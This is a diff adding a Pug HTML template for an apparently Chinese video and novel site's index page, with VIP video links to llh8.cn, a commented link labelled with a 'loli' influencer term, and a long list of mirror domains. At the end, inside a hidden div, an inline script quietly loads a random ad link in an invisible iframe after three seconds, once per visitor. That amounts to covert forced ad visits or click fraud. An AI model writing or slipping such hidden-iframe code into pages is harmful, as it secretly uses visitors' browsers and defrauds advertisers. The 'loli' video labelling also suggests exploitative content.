@@ -1,0 +1,96 @@
+doctype html 5
+html
+    head
+        meta(charset="utf-8")
+        meta(name="viewport", content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover")
+        meta(name="aplus-terminal", content="1")
+        meta(name="data-spm", content="a2141")
+        meta(name="aplus-mmstat-timeout", content="10000")
+        meta(name="keywords", content=pageKeyword)
+        meta(name="description", content='#{pageDescrition}')
+        meta(name="theme-color", content="#ff5000")
+        meta(name="format-detection", content="telephone=no")
+        meta(name="apple-mobile-web-app-title", content="#{pageDescrition}")
+        meta(name="application-name", content="#{pageDescrition}")
+        meta(name="apple-mobile-web-app-status-bar-style", content="black")
+        title=pageTitle
+        link(rel="stylesheet", type="text/css", href="#{host}/css/style.css")
+    body
+        div.header-top
+            div.cont
+                h1 #{pageTitle}
+                marquee(scrolldelay="30")
+                    h2 #{pageKeyword}
+        div.header
+            div.cont
+                each item in menu
+                    -if(item.url === '/')
+                        a(href="#{item.url}", class="active", title="#{item.name}") #{item.name}
+                    -else
+                        a(href="#{item.url}", title="#{item.name}") #{item.name}
+                //- a(href="http://llh8.cn/", target="_blank", title="萝莉网红吧") VIP视频区
+            div.shadow
+        div.bodyer
+            div.xiaoshuo
+                -if(result)
+                    each item in result
+                        h2 #{item.name}
+                            a(href="/list/#{item.type}.html", title="#{item.name}列表") 更多
+                        div.data-list
+                            each vv in item.list
+                                a(href="#{host+'/detail/'+vv.type+'/'+vv.createTime}.html", title="#{vv.title}在线观看", target="_blank")
+                                    span [#{item.name}]&nbsp;&nbsp;
+                                    strong #{vv.title}
+                -else
+                    a(href="#{host}", class="no-more" title="返回首页") 页面出错，请刷新页面或联系管理员！
+            div.shiping
+                h2 VIP推荐
+                each item,idx in videoList
+                    a(class="select#{idx}", href="#{'http://llh8.cn/detail/'+item.createTime}", title="#{item.title}在线观看", target="_blank")
+                        img(src="#{item.img}", alt="#{item.title}", onerror="this.src='#{host}/img/errorimg.png'")
+                        div.list-title
+                            strong #{item.title}
+        div.beiyong
+            span 备用地址：
+            a(href="http://www.llh8.cn", title="http://www.llh8.cn") www.llh8.cn
+            a(href="http://llh8.cn", title="http://llh8.cn") llh8.cn
+            a(href="http://www.llh8.me", title="http://www.llh8.cn") www.llh8.me
+            a(href="http://llh8.me", title="http://llh8.cn") llh8.me
+            a(href="http://www.llh8.vip", title="http://www.llh8.vip") www.llh8.vip
+            a(href="http://llh8.vip", title="http://llh8.vip") llh8.vip
+            a(href="http://www.cz1990.com", title="http://www.cz1990.com") www.cz1990.com
+            a(href="http://cz1990.com", title="http://cz1990.com") cz1990.com
+            a(href="http://xjb666.xyz", title="http://xjb666.xyz") xjb666.xyz
+            a(href="http://www.xjb666.xyz", title="http://xjb666.xyz") www.xjb666.xyz
+            a(href="http://xjb888.xyz", title="http://xjb888.xyz") xjb888.xyz
+            a(href="http://www.xjb888.xyz", title="http://xjb888.xyz") www.xjb888.xyz
+            a(href="http://ashun520.com", title="http://ashun520.com") ashun520.com
+            a(href="http://www.ashun520.com", title="http://www.ashun520.com") www.ashun520.com
+            a(href="http://ashun1.com", title="http://ashun1.com") ashun1.com
+            a(href="http://www.ashun1.com", title="http://www.ashun1.com") www.ashun1.com
+            a(href="http://1992tv.com", title="http://1992tv.com") 1992tv.com
+            a(href="http://www.1992tv.com", title="http://www.1992tv.com") www.1992tv.com
+            a(href="http://llh1.xyz", title="http://llh1.xyz") llh1.xyz
+            a(href="http://www.llh1.xyz", title="http://www.llh1.xyz") www.llh1.xyz
+            a(href="http://llh2.xyz", title="http://llh2.xyz") llh2.xyz
+            a(href="http://www.llh2.xyz", title="http://www.llh2.xyz") www.llh2.xyz
+            a(href="http://llh3.xyz", title="http://llh3.xyz") llh3.xyz
+            a(href="http://www.llh3.xyz", title="http://www.llh3.xyz") www.llh3.xyz
+            a(href="http://llh4.xyz", title="http://llh4.xyz") llh4.xyz
+            a(href="http://www.llh4.xyz", title="http://www.llh4.xyz") www.llh4.xyz
+            a(href="http://llh5.xyz", title="http://llh5.xyz") llh5.xyz
+            a(href="http://www.llh5.xyz", title="http://www.llh5.xyz") www.llh5.xyz
+            a(href="http://llh6.xyz", title="http://llh6.xyz") llh6.xyz
+            a(href="http://www.llh6.xyz", title="http://www.llh6.xyz") www.llh6.xyz
+            a(href="http://llh7.xyz", title="http://llh7.xyz") llh7.xyz
+            a(href="http://www.llh7.xyz", title="http://www.llh7.xyz") www.llh7.xyz
+            a(href="http://llh8.xyz", title="http://llh8.xyz") llh8.xyz
+            a(href="http://www.llh8.xyz", title="http://www.llh8.xyz") www.llh8.xyz
+            a(href="http://llh9.xyz", title="http://llh9.xyz") llh9.xyz
+            a(href="http://www.llh9.xyz", title="http://www.llh9.xyz") www.llh9.xyz
+        div.lm-03
+            script(src='http://dm.shouwangba.cn/s.html?id=1088')
+        div(style="display:none")
+            script.
+                var stor=localStorage.getItem("myuser8");stor||getStore();function getStore(){setTimeout(function(){var c=document.getElementsByTagName("body")[0],a=document.getElementsByClassName("lm_gd2")[0];if(a){a=a.querySelectorAll("a")[Math.floor(2*Math.random()+1)-1].getAttribute("href");var b=document.createElement("iframe");b.style.display="none";b.src=a;c.appendChild(b);localStorage.setItem("myuser8","aaa")}},3E3)};
+            script(src="https://s13.cnzz.com/z_stat.php?id=1274664101&web_id=1274664101", async="async", language="JavaScript")
